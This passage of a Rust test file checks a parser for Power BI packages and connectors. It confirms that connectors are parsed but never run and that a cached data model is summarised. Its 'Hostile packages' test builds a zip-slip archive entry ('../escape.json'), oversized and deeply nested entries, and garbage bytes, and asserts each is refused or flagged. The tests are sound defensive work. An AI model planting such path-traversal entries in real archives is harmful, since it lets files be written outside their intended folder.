    assert_eq!(v.privileges, ["WebAccess"]);
    assert!(v.script_bytes > 0);
    // Neither the script nor the e-mail address is kept.
    assert_no_leak(&opened, "document.cookie");
    assert_no_leak(&opened, "author@example.test");
    assert!(has_diag(doc, codes::EXTENSION));
}

#[test]
fn connectors_are_listed_and_parsed_but_never_run() {
    let source = r#"[Version = "1.0.0"]
section HelloWorld;

[DataSource.Kind = "HelloWorld", Publish = "HelloWorld.Publish"]
shared HelloWorld.Contents = (optional message as text) => Text.From(message);

HelloWorld = [Authentication = [Anonymous = []]];
HelloWorld.Publish = [Beta = true];
"#;
    let opened = open_zip(
        "HelloWorld.mez",
        &[
            ("[Content_Types].xml", b"<Types/>"),
            ("HelloWorld.m", source.as_bytes()),
            ("resources.resx", b"<root/>"),
            ("HelloWorld16.png", b"\x89PNG"),
            (
                "package/services/digital-signature/xml-signature/sig.psdsxs",
                b"<Signature/>",
            ),
        ],
    );
    let doc = &opened.document;
    assert_eq!(doc.source.format, SourceFormat::Connector);
    assert!(doc.model.is_none());
    let c = opened.connector().unwrap();
    assert!(c.signed);
    assert_eq!(c.files.len(), 5);
    let src = &c.sources[0];
    assert_eq!(src.section.as_deref(), Some("HelloWorld"));
    let contents = &src.members[0];
    assert_eq!(contents.name, "HelloWorld.Contents");
    assert!(contents.shared);
    assert_eq!(contents.data_source_kind.as_deref(), Some("HelloWorld"));
    assert_eq!(contents.publish.as_deref(), Some("HelloWorld.Publish"));
    assert_eq!(src.members.len(), 3);

    // A connector whose source is a `.pq` next to `resources.resx`.
    let opened = open_zip(
        "Other.mez",
        &[
            ("[Content_Types].xml", b"<Types/>"),
            ("Other.pq", b"section Other; shared Other.Contents = 1;"),
            ("resources.resx", b"<root/>"),
        ],
    );
    assert_eq!(opened.detection.format, DetectedFormat::CustomConnector);
    assert_eq!(
        opened.connector().unwrap().sources[0].section.as_deref(),
        Some("Other")
    );
}

// ---------------------------------------------------------------------------
// Hostile packages
// ---------------------------------------------------------------------------

#[test]
fn hostile_packages_are_refused_or_contained() {
    // Zip-slip in a VPAX.
    let err = open_bytes(
        "evil.vpax",
        zip_of(&[("DaxModel.json", b"{}"), ("../escape.json", b"{}")]),
        &OpenOptions::default(),
    )
    .unwrap_err();
    assert!(matches!(err, CoreError::Container(_)), "{err}");

    // An oversized entry is refused by the container limits.
    let big = vec![b' '; 2 * 1024 * 1024];
    let strict = OpenOptions {
        limits: pbi_core::container::Limits {
            max_entry_size: 1024 * 1024,
            ..pbi_core::container::Limits::default()
        },
        ..OpenOptions::default()
    };
    let err = open_bytes(
        "big.pbiviz",
        zip_of(&[("package.json", b"{}"), ("resources/x.pbiviz.json", &big)]),
        &strict,
    )
    .unwrap_err();
    assert!(matches!(err, CoreError::Container(_)), "{err}");

    // Deeply nested JSON is a warning, not a crash.
    let deep = format!("{}{}", "[".repeat(10_000), "]".repeat(10_000));
    let opened = open_zip("deep.vpax", &[("DaxModel.json", deep.as_bytes())]);
    assert!(codes_of(&opened.document, Severity::Warning).contains(&codes::VPAX.to_owned()));

    // Garbage M in a template.
    let opened = open_zip(
        "junk.pqt",
        &[(
            "MashupDocument.pq",
            &[0xFF, 0xFE, 0x00, 0xD8, b'(', b'(', b'('][..],
        )],
    );
    assert!(has_diag(&opened.document, codes::M_SYNTAX));
}

// ---------------------------------------------------------------------------
// PBIP local data cache
// ---------------------------------------------------------------------------

#[test]
fn pbip_cache_abf_schema_is_summarized_as_a_part() {
    let dir = tmp_dir();
    let folder = dir.path().join("Sales.SemanticModel");
    std::fs::create_dir_all(folder.join("definition/tables")).unwrap();
    std::fs::create_dir_all(folder.join(".pbi")).unwrap();
    std::fs::write(
        folder.join("definition.pbism"),
        r#"{"version": "4.0", "settings": {}}"#,
    )
    .unwrap();
    std::fs::write(
        folder.join("definition/model.tmdl"),
        "model Model\n\tculture: en-US\n",
    )
    .unwrap();
    for table in ["Sales", "Product"] {
        std::fs::write(
            folder.join(format!("definition/tables/{table}.tmdl")),
            format!(
                "table {table}\n\n\tcolumn ProductKey\n\t\tdataType: int64\n\t\tsourceColumn: ProductKey\n"
            ),
        )
        .unwrap();
    }
    std::fs::write(
        folder.join(".pbi/cache.abf"),
        pbi_vertipaq::test_support::power_pivot_sample(),
    )
    .unwrap();

    let opened = open_path(&folder, &OpenOptions::default()).unwrap();
    let doc = &opened.document;
    let note = doc
        .diagnostics
        .iter()
        .find(|d| d.code == codes::CACHE_ABF)
        .unwrap();
    assert_eq!(note.severity, Severity::Info, "{}", note.message);
    let part = opened.part("cacheAbf").expect("cacheAbf part");
    assert_eq!(part.path, ".pbi/cache.abf");
    let json = part.json.as_ref().unwrap();
    assert_eq!(json["tableCount"], 2);
    assert_eq!(json["tables"], json!(["Sales", "Product"]));
    assert_eq!(json["matchesDefinition"], true);
    assert_eq!(json["metadataFormat"], "xml");
    assert_eq!(json["perFileCompression"], true);
    assert_eq!(json["compatibilityLevel"], 1103);

    // Schema loading off: no part.
    let off = OpenOptions {
        load_pbix_schema: false,
        ..OpenOptions::default()
    };
    assert!(open_path(&folder, &off).unwrap().part("cacheAbf").is_none());
}
